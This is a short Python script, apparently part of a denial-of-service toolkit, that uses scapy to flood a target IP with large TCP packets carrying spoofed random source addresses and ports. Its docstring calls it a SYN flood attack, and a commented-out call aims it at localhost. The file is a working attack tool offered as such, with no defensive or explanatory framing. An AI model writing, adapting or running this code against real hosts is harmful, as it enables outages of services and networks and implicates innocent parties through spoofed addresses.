# Requires scapy and npcap
from scapy.all import IP, TCP, send
from utilities import randInt, randomIP


def BANDWIDTH_ddos(targetIP, numPackets, ports, size=65495):
    """
    Sends packets of specified size

    Parameters:
    targetIP (str) : IP to run SYN Flood attack on
    numPackets (int) : Number of SYN packets to send to each port
    """
    
    # Loop over number of packets to send to each port
    for i in range(numPackets):
        # Generate spoofed TCP packet values
        spoof_port = randInt()
        
        # Loop over each specified port
        for port in ports:
            payload = b'X' * size

            # Send spoofed TCP SYN packet
            send(IP(src=randomIP(), dst=targetIP)/TCP(sport=spoof_port, dport=port)/payload, verbose=0)
            #print(f"Sent packet to {targetIP}:{port}")


#BANDWIDTH_ddos('127.0.0.1', 3, [80], 65495)